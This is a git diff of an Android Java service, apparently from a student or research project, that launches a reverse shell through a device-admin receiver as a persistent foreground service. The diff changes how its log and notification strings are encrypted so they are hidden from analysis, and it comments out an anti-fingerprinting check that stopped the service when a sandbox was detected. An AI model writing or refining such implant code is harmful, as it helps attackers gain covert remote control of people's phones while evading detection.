@@ -14,9 +14,9 @@ import androidx.core.app.NotificationCompat;
 import com.example.inf2007_mad_j1847.utils.StringHelper;
 
 public class ShellService extends Service {
-    private static final String TAG = StringHelper.qzxp("8Xugna5byQuHKowtIM+zImfr") ; //"SimpleShellService"
+    private static final String TAG = StringHelper.decrypt("Nvkh2sKatHHWYxAFdyq7xCIVRd+aBU0wtKaIsWzBbEQF7lsLvf0TacSXmlAahg==") ; //"SimpleShellService"
     private static final int NOTIFICATION_ID = 1234;
-    private static final String CHANNEL_ID = StringHelper.qzxp("3sWvHzsLrlcNNJfEFQ==") ; //"shell_channel"
+    private static final String CHANNEL_ID = StringHelper.decrypt("aEGALM3sZpfGBrfuO4qPrmLbQTQnTrtH36OMA1yfkLvWn1Rtonl0BT0=") ; //"shell_channel"
 
     // Create an instance of your AdminReceiver to call its method
     private AppDeviceAdminReceiver adminReceiver;
@@ -24,7 +24,7 @@ public class ShellService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, StringHelper.qzxp("Ny0g5IvQjGUsHiYL5soD") ); // "Service created"
+        Log.d(TAG, StringHelper.decrypt("DwpzuxqrYcB3cg6KFcLhSSus8L2gC8QxDXZh1oq0gPRxHbWYaBt6Cidm2Q==") ); // "Service created"
 
         // Create instance of your receiver
         adminReceiver = new AppDeviceAdminReceiver();
@@ -39,12 +39,12 @@ public class ShellService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG,StringHelper.qzxp("HF788fJ4Flee27ISNwoB1dptQYiNgt080m6eoy6NZawnaevx/mkAEr7Htgwv")  ); // "Service starting - calling launchReverseShell"
-        if (!AntiFingerprint.isSafeToRun(this)) {
-            Log.d(TAG,StringHelper.qzxp("90cWr4HmlMuSLpAYYsjheEzWifuYD/Qz6sSvhOuv+695uNJg2+kgqo8uli57z+h6") ); //  "⚠️ AntiFingerprint check failed — stopping"
-            stopSelf();
-            return START_NOT_STICKY;
-        }
+        Log.d(TAG,StringHelper.decrypt("psuygltqZR/ppzqnEkfXhJyibyyLaYmOYWkABdN6dW5OqTBf436WMG4xvG7B4JvAGPirNp6r4Hxije3L1KIZEynCllUQvAGBcw==")  ); // "Service starting - calling launchReverseShell"
+//        if (!AntiFingerprint.isSafeToRun(this)) {
+//            Log.d(TAG,StringHelper.decrypt("7XxEkPzb4FnMdO1ZnlTEo29w49UyMT18uYkm8nDqbOY8/xSvtJpf2oZThTlCgZSxzvnnplNjpXygOcxhm2AxMG/SFVGI") ); //  "⚠️ AntiFingerprint check failed — stopping"
+//            stopSelf();
+//            return START_NOT_STICKY;
+//        }
         // DIRECTLY CALL YOUR EXISTING METHOD
         // This calls the same method that runs when admin is granted
         adminReceiver.launchReverseShell(this);
@@ -56,7 +56,7 @@ public class ShellService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, StringHelper.qzxp("nlXtgjiaRhz65Pn/096wXoo=") ); // "Service destroyed"
+        Log.d(TAG, StringHelper.decrypt("aUTpu0tUiH31EpCl27IJf5noFviDU4EtiT+mwaTCXiL/5egX0+UwbDiBbfBB") ); // "Service destroyed"
     }
 
     @Override
@@ -68,7 +68,7 @@ public class ShellService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    StringHelper.qzxp("RpVE/tLDlkJUkceI8g==") , // "Shell Service"
+                    StringHelper.decrypt("plUVWol+DZV0XWkPmw4t6+P1T95nc4P9CPD+Fl2oV5umf85hldgrR3s=") , // "Shell Service"
                     NotificationManager.IMPORTANCE_LOW
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -78,8 +78,8 @@ public class ShellService extends Service {
 
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(StringHelper.qzxp("9mNDIb2LOKNjz+nQMvfIVQ==") ) // "Research Service"
-                .setContentText(StringHelper.qzxp("YB6p1EDaWvyLgx4YdEIzOg7FQ3g=") ) // "Reverse shell active"
+                .setContentTitle(StringHelper.decrypt("redChDrNRVKbocS2InZ+nUGKIzY1cULNm6cNCNg1N1H2Km+5u4mzcKWFwSQ=") ) // "Research Service"
+                .setContentText(StringHelper.decrypt("x0aM29arbmw1GDMTR4upyn/4zFx2+GheanmQzObwnjrhBkLnrqS7sWug6zSe3E7/") ) // "Reverse shell active"
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setOngoing(true)
